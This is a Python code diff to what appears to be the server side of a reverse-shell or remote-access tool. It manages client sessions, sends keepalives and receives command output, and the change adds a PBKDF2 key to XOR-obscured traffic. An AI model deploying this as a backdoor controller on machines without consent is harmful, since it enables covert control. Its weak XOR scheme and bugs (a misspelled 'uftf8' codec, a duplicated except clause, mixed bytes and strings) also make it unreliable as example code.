@@ -29,9 +29,7 @@ class Management(threading.Thread):
             
             time.sleep(self.timeout)
             for key in Handler.dict_conn.keys():
-                #print(list(enumerate(Handler.dict_conn[0])))
-                
-                
+                       
                 if(Handler.dict_conn[key][NB_ALIVE] ==True and Handler.dict_conn[key][NB_SOCKET] ==False):
                     print("\n\n\nChange value Is he alive true to false.")
                     Handler.dict_conn[key][NB_ALIVE] = False
@@ -41,7 +39,7 @@ class Management(threading.Thread):
                 if(Handler.dict_conn[key][NB_ALIVE] and bool(Handler.dict_conn[key][NB_SOCKET]) and not Handler.dict_conn[key][NB_SELECT]): #If the connection is alive (True) and the socket object is active (True)
 
                     try:
-                        Handler.dict_conn[key][NB_SOCKET].send(XOREncryption(Management.is_life).encode())
+                        Handler.dict_conn[key][NB_SOCKET].send(XOREncryption(Management.is_life, Handler.PBKDF2_Key).encode())
                         #print(Handler.dict_conn[key][8])
 
                     except ConnectionError as connerr: #If the connection does not answer
@@ -80,9 +78,8 @@ class CheckConn:
         Returns true if the socket was sent if not retrun false if there was a problem.
         '''
         try:
-            print("[==] sendata")
 
-            sock.send(XOREncryption(payload).encode())
+            sock.send(XOREncryption(payload, Handler.PBKDF2_Key).encode())
         except ConnectionError as connerr: #If the connection does not answer
             if(Handler.status_connection_display):
                 printColor("error","[-] The connection to the client was cut {}:{}.\n".format(Handler.dict_conn[nb_session][NB_IP],Handler.dict_conn[nb_session][NB_PORT]))
@@ -99,16 +96,17 @@ class CheckConn:
         
         while True:
             try:            
-                data = sock.recv(buffer)
+                data_tmp = sock.recv(buffer).decode("utf8","ignore")
+                data = XOREncryption(data_tmp, Handler.PBKDF2_Key)
             except socket.timeout:
                 result = b"ERRROR"
                 break
             except ConnectionError as connerr:
                 printColor("error", "[-] Error in recvall: {}".format(connerr))
-                result = b"ERROR" #safe ?
+                result = "ERROR" #safe ?
                 break
             else:
-                if(data ==b"\r\n"):
+                if(data =="\r\n"):
                     break
                 else:
                     result+=data
@@ -116,40 +114,49 @@ class CheckConn:
         sock.settimeout(None)
         return result
     
-    def recvsafe(self,sock,buffer):
+    def recvsafe(self,sock,buffer): #Receives a single secure data (no need for "\r\n") to finish the connection 
         
         result = b""
         sock.settimeout(SOCK_TIMEOUT)
         try:            
-            result = sock.recv(buffer)
+            data_tmp = sock.recv(buffer).decode("uftf8","ignore")
+            result = XOREncryption(data_tmp, Handler.PBKDF2_Key)
         except socket.timeout:
             printColor("error", "[-] timeout in recvsafe.")
             result = b"ERROR"
+        except socket.timeout:
+            printColor("error","[-] The timeout was exceeded. \n")
         except ConnectionError as connerr:
             printColor("error", "[-] error in recvsafe: {}".format(connerr))
             result = b"ERROR"
         finally:
             sock.settimeout(None)
             return result #empty return
+        
     
-    def recvcommand(self, sock, buffer):#The decryption of xor is automatic on this method.
+    def recvcommand(self, sock, buffer):#The decryption of xor is automatic on this method. Does not send data displays the data in real time.
         #Gets the data without delay (session "-c 'command' ")
-        result = ""
+        sock.settimeout(13)
 
         while True:
             try:
-                data_tmp = sock.recv(buffer).decode("utf8","replace")
-                print("\nn\----->1:",data_tmp)
-                data = XOREncryption(data_tmp)
-                
+                data_tmp = sock.recv(buffer).decode("utf8","ignore")
+                print("data recv....")
+                data = XOREncryption(data_tmp, Handler.PBKDF2_Key)
+
+                printColor("successfully",data)
+            except socket.timeout:
+                printColor("error","[-] The timeout was exceeded. \n")
+                time.sleep(1)
+                break
             except ConnectionError as connerr:
                 printColor("error", "[-] error in recvsafe: {}".format(connerr))
-                result = b"ERROR"
+                time.sleep(1)
+                break
             else:
                 if(data =="\r\n"):
                     break
                 else:
-                    result += data
-        
-        #print("RESULT: ", result)
-        return result
+                    pass
+
+        sock.settimeout(None)
